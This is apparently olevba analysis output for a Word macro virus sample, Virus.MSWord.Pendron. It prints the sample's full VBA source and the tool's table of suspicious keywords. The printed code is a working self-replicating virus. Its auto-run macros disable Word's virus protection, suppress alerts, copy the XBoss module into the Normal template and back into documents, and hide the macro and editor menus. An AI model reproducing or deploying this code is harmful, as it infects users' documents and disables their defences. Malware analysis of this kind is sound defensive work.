olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pendron
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pendron - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO XBoss.bas 
in file: Virus.MSWord.Pendron - OLE stream: 'Macros/VBA/XBoss'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Boss41()
On Error GoTo Cilaka
    Application.Run MacroName:="Normal.XBoss.ToolsCustomize"
    CommandBars("Tools").Controls(14).Delete
Cilaka:
End Sub
Sub ToolsCustomize()
End Sub
Sub ViewVBCode()
End Sub
Sub FilePrintPreview()
End Sub
Sub FilePrintPreviewFullScreen()
End Sub
Sub ToolsMacro()
masuk:
kode$ = "princess"
pass$ = InputBox("Enter Your Password", "Pendron Security", , 1, 1)
If pass$ <> kode$ Then GoTo Cilaka
Dialogs(wdDialogToolsMacro).Show
GoTo selesai
Cilaka:
MsgBox "You Wrong My Friend !!!", vbCritical, "Pendron GN'R Production"
GoTo masuk
selesai:
End Sub
Sub ToolsOptions()
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Saves a copy of the document in a separate file"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.FileSaveAs"
On Error GoTo XBoss
PlanetJangkit
TularComputer
XBoss:
End Sub
Sub AutoClose()
On Error GoTo XBoss
PlanetJangkit
TularComputer
XBoss:
End Sub
Sub AutoExec()
On Error GoTo XBoss
If WeekDay(Now()) = 6 And Day(Now()) = 11 Then
Assistant.Visible = True
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "Hallo Sobat Semua...."
    .Text = "Salam Buat Anak-Anak Gunadarma From Pendron"
    .Animation = msoAnimationEmptyTrash
    .Show
End With
End If
XBoss:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Planet Computer\r\nSalam Buat Kamu semua"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.budi.AutoOpen"
On Error GoTo XBoss
Boss41
PlanetJangkit
TularComputer
XBoss:
End Sub
Sub PlanetJangkit()
On Error GoTo XBoss
Options.VirusProtection = False
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
        Options.VirusProtection = False
        Application.UserName = "Pendron"
        Application.UserInitials = "Gunadarma"
DocumentInstalled = False
Options.EnableSound = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
If NormalInstalled = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.Name, Name:="XBoss", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
End If
XBoss:
End Sub
Sub TularComputer()
On Error GoTo XBoss
Options.VirusProtection = False
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
        Options.VirusProtection = False
        Application.UserName = "Pendron"
        Application.UserInitials = "Gunadarma"
DocumentInstalled = False
Options.EnableSound = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
If NormalInstalled = False Then
Application.OrganizerCopy Source:=ActiveDocument.Name, Destination:=NormalTemplate.FullName, Name:="XBoss", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
XBoss:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

